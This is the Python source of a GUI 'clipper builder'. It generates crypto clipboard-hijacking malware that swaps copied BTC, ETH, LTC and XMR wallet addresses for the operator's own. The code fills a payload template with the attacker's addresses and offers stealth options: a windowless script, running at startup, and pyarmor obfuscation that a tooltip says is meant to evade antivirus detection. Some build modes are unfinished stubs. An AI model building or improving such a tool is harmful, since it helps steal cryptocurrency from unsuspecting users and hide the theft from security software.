from CTkMessagebox import CTkMessagebox

import customtkinter
import subprocess
import webbrowser
import CTkToolTip
import shutil
import hPyT
import re
import os
#needs pyarmor for obfuscator - pyarmor gen main.py

btc_address_pattern = r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$"
eth_address_pattern = r"^(0x)?[0-9a-fA-F]{40}$"
xmr_address_pattern = r"^4[0-9AB][0-9a-zA-Z]{93}$"
ltc_address_pattern = r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"

customtkinter.set_appearance_mode("dark")

cwd = os.getcwd()

class resetconfig:
    def reset(btc_addr, eth_addr, xmr_addr, ltc_addr):
        set_config_btn.configure(text="set config", fg_color="green", hover_color="#063b00", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr))
        config_set_lbl.configure(text="config not set", text_color="red")
        check_valid_btn.configure(text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr))
        exe_file_checkbox.deselect()
        obfuscate_checkbox.deselect()
        single_use_checkbox.deselect()
        clipper_type.set("set clipper type")
        buildclipperconfig.class_called = 0

class build:
    def send_to_exe():
        pass

    def obfuscate(current_path, new_file_name):
        subprocess.run(["pyarmor", "gen", f"{current_path}", "--output=output/dist", "--pack=onefile"])
        os.remove(current_path)

    def build_all(single_use, obfuscate, exe_file):
        print("build_all")

    def build_subprocess(single_use, obfuscate, exe_file):
        if single_use == "on":
            single_use = True
        else:
            single_use = False
        
        btc_addr = btc_addr1
        eth_addr = eth_addr1
        ltc_addr = ltc_addr1
        xmr_addr = xmr_addr1

        if btc_addr == "":
            btc_addr = "SET BTC ADDRESS HERE"
        if eth_addr == "":
            eth_addr = "SET ETH ADDRESS HERE"
        if ltc_addr == "":
            ltc_addr = "SET LTC ADDRESS HERE"
        if xmr_addr == "":
            xmr_addr = "SET XMR ADDRESS HERE"
        
        with open("scripts\\main.pyw", "r") as file:
            script_content = file.read()
        
        with open("scripts\\temp.pyw", "w") as file:
            file.write(script_content)
            file.close()
        
        with open("scripts\\temp.pyw", "r") as file:
            script_content = file.read()
        
        script_content = script_content.replace('btcaddr = "SET BTC ADDRESS HERE"', f"btcaddr = '{btc_addr}'")
        script_content = script_content.replace('ethaddr = "SET ETH ADDRESS HERE"', f"ethaddr = '{eth_addr}'")
        script_content = script_content.replace('ltcaddr = "SET LTC ADDRESS HERE"', f"ltcaddr = '{ltc_addr}'")
        script_content = script_content.replace('xmraddr = "SET XMR ADDRESS HERE"', f"xmraddr = '{xmr_addr}'")
        script_content = script_content.replace('single_use = False', f'single_use = {single_use}')

        if out_name.get().strip() == "":
            new_file_name = "subprocess_clipper.pyw"

            with open(os.path.join("output", new_file_name), "w") as new_file:
                new_file.write(script_content)
        else:
            if ".pyw" not in out_name.get().strip():
                check_valid_btn.configure(text="build", command=lambda: build.check_type(), state="normal")
                CTkMessagebox(title="error", message="file must end in .pyw (python windowless)", icon="cancel")
            else:
                new_file_name = out_name.get().strip()
                with open(os.path.join("output", new_file_name), "w") as new_file:
                    new_file.write(script_content)
        
        if obfuscate == "on":
            current_path = os.path.join("output", new_file_name)
            build.obfuscate(current_path, new_file_name)
        else:
            pass

        os.remove("scripts/temp.pyw")

    def build_ctypes(single_use, obfuscate, exe_file):
        print("build_ctypes")

    def build_pyperclip(single_use, obfuscate, exe_file):
        print("build_pyperclip")

    def check_type():
        check_valid_btn.configure(state="disabled", text="building...")
        if type == "subprocess (0 external modules - stealth)":
            build.build_subprocess(single_use, obfuscate, exe_file)
        if type == "ctypes (0 external modules - stealth)":
            build.build_ctypes(single_use, obfuscate, exe_file)
        if type == "pyperclip (1 external module - no stealth)":
            build.build_pyperclip(single_use, obfuscate, exe_file)
        if type == "create all with given settings":
            build.build_all(single_use, obfuscate, exe_file)

class buildclipperconfig:
    class_called = 0

    def set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr):
        global type, single_use, obfuscate, exe_file

        type = str(clipper_type.get())

        single_use = single_use_checkbox.get()
        obfuscate = obfuscate_checkbox.get()
        exe_file = exe_file_checkbox.get()

        if obfuscate == "on" and exe_file == "on":
            CTkMessagebox(title="error", message="both normal .exe and obfuscate .exe cannot be on", icon="cancel")
        else:
            if type == "set clipper type":
                CTkMessagebox(title="error", message="please pick a valid clipper type", icon="cancel")
                buildclipperconfig.class_called = 0
            else:
                buildclipperconfig.class_called += 1
                config_set_lbl.configure(text="config set", text_color="green")
                set_config_btn.configure(text="reset config", fg_color="red", hover_color="#8B0000", command=lambda: resetconfig.reset(btc_addr, eth_addr, xmr_addr, ltc_addr))

class buildgui:
    def check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr):
        if buildclipperconfig.class_called == 0:
            CTkMessagebox(title="error", message="please set a config", icon="cancel")

        else:
            global btc_addr1, eth_addr1, xmr_addr1, ltc_addr1

            btc_addr1 = str(btc_addr.get()).strip()
            eth_addr1 = str(eth_addr.get()).strip()
            xmr_addr1 = str(xmr_addr.get()).strip()
            ltc_addr1 = str(ltc_addr.get()).strip()

            if btc_addr1 == "" and eth_addr1 == "" and xmr_addr1 == "" and ltc_addr1 == "":
                CTkMessagebox(title="info", message="please add at least one crypto address")
            else:

                try:
                    if btc_addr1 != "":
                        if re.match(btc_address_pattern, btc_addr1):
                            btc_addr.configure(border_color="green")

                    if eth_addr1 != "":
                        if re.match(eth_address_pattern, eth_addr1):
                            eth_addr.configure(border_color="green")

                    if xmr_addr1 != "":
                        if re.match(xmr_address_pattern, xmr_addr1):
                            xmr_addr.configure(border_color="green")

                    if ltc_addr1 != "":
                        if re.match(ltc_address_pattern, ltc_addr1):
                            ltc_addr.configure(border_color="green")
                    
                    check_valid_btn.configure(text="build", command=lambda: build.check_type())

                except Exception as e:
                    CTkMessagebox(title="error", message=e, icon="cancel")

    def build_widgets():
        global check_valid_btn, config_set_lbl, set_config_btn, clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, out_name

        for widget in option_frame.winfo_children():
            widget.destroy()
        for widget in option_frame.winfo_children():
            widget.destroy()

        customtkinter.CTkLabel(master=option_frame, text="clipper settings").pack(padx=65)
        customtkinter.CTkLabel(master=main_frame, text="(if address format isnt correct border will stay same rather than turn green)").pack()

        btc_addr = customtkinter.CTkEntry(master=main_frame, placeholder_text="BTC address (leave empty if none): ")
        btc_addr.pack(fill="x", padx=5, pady=5)
        eth_addr = customtkinter.CTkEntry(master=main_frame, placeholder_text="ETH address (leave empty if none): ")
        eth_addr.pack(fill="x", padx=5, pady=0)
        ltc_addr = customtkinter.CTkEntry(master=main_frame, placeholder_text="LTC address (leave empty if none): ")
        ltc_addr.pack(fill="x", padx=5, pady=5)
        xmr_addr = customtkinter.CTkEntry(master=main_frame, placeholder_text="XMR address (leave empty if none): ")
        xmr_addr.pack(fill="x", padx=5, pady=0)
        out_name = customtkinter.CTkEntry(master=main_frame, placeholder_text="output file name WITH .py extention (leave empty if for defult name): ")
        out_name.pack(fill="x", padx=5, pady=5)
        check_valid_btn = customtkinter.CTkButton(master=main_frame, text="check validity of addresses", command=lambda: buildgui.check_addr_valid(btc_addr, eth_addr, xmr_addr, ltc_addr))
        check_valid_btn.pack(fill="x", padx=5, pady=0)
        kill_reset_btn = customtkinter.CTkButton(master=main_frame, text="KILL AND RESET ALL FRAMES", fg_color="red", hover_color="#8B0000", font=("", 13, "bold"))
        kill_reset_btn.pack(fill="x", padx=5, pady=5)
        
        clipper_type = customtkinter.CTkComboBox(master=option_frame, state="readonly", 
                                                 values=["set clipper type", 
                                                         "subprocess (0 external modules - stealth)", 
                                                         "ctypes (0 external modules - stealth)", 
                                                         "pyperclip (1 external module - no stealth)", 
                                                         "create all with given settings"])
        clipper_type.set("set clipper type")
        clipper_type.pack(fill="x", padx=10, pady=5)
        single_use_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="single use - stealth 1/3", onvalue="on", offvalue="off")
        single_use_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
        obfuscate_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="obfuscated .exe - stealth 3/3", onvalue="on", offvalue="off")
        obfuscate_checkbox.pack(pady=5, anchor="w", padx=(12, 0))
        exe_file_checkbox = customtkinter.CTkCheckBox(master=option_frame, text="normal .exe file - stealth 2/3", onvalue="on", offvalue="off")
        exe_file_checkbox.pack(pady=0, anchor="w", padx=(12, 0))
        set_config_btn = customtkinter.CTkButton(master=option_frame, fg_color="green", hover_color="#063b00", text="set config", command=lambda: buildclipperconfig.set_config(clipper_type, single_use_checkbox, obfuscate_checkbox, exe_file_checkbox, btc_addr, eth_addr, xmr_addr, ltc_addr))
        set_config_btn.pack(fill="x", padx=10, pady=5)
        config_set_lbl = customtkinter.CTkLabel(master=option_frame, text="config not set", text_color="red")
        config_set_lbl.pack()

        CTkToolTip.CTkToolTip(widget=single_use_checkbox, message="single use: code will run at startup until it detects a address to replace, when this happens the code will never run again - essentially only ever clipping once", delay=0.5, wraplength=300)
        CTkToolTip.CTkToolTip(widget=obfuscate_checkbox, message="obfuscate: will run obfucscation and make .exe to make it more difficult to read and more difficult for anti virus detections", delay=0.5, wraplength=300)
        CTkToolTip.CTkToolTip(widget=exe_file_checkbox, message=".exe file: will turn the python code into a .exe file without obfuscating", delay=0.5, wraplength=300)
        CTkToolTip.CTkToolTip(widget=clipper_type, message="set clipper type: all methods read and regex the clipboard for crypto addresses, then replace the address with your chosen one. the subprocess method uses Pythons subprocess, which is stealthy but may be slightly slower on some laptops. the ctypes method, also stealthy and included with Python, is fast. the pyperclip method, requiring an external installation (pip install), is fast but less stealthy. subprocess and ctypes are equally effective, while pyperclip is least recommended", delay=0.5, wraplength=300)
    
    def main():
        global option_frame, main_frame

        root = customtkinter.CTk()
        root.title("clipper builder by 3022-2")
        root.minsize(width=800, height=400)
        root.geometry("600x400")
        root.resizable(height=False, width=False)
        root.iconbitmap("bitcoin__1__IY4_icon.ico")

        hPyT.rainbow_border.start(window=root, interval=5)

        tabview = customtkinter.CTkTabview(master=root)
        tabview.pack(fill="both", expand=True, padx=5, pady=5)
        tabview.add("builder")
        tabview.add("documentation")
        tabview._segmented_button.grid(sticky="w", padx=10)

        option_frame = customtkinter.CTkFrame(master=tabview.tab("builder"), fg_color="#242424")
        option_frame.pack(side="left", fill="y")
        main_frame = customtkinter.CTkFrame(master=tabview.tab("builder"), fg_color="#242424")
        main_frame.pack(fill="both", expand=True, side="right", anchor="n", padx=(5, 0))

        customtkinter.CTkScrollableFrame(master=tabview.tab("documentation"), fg_color="#242424").pack(fill="both", expand=True)
        customtkinter.CTkButton(master=tabview.tab("documentation"), text="https://github.com/3022-2", command=lambda: webbrowser.open_new_tab("https://github.com/3022-2")).pack(fill="x", pady=(5, 0))

        buildgui.build_widgets()

        root.mainloop()

if __name__ == "__main__":
    buildgui.main()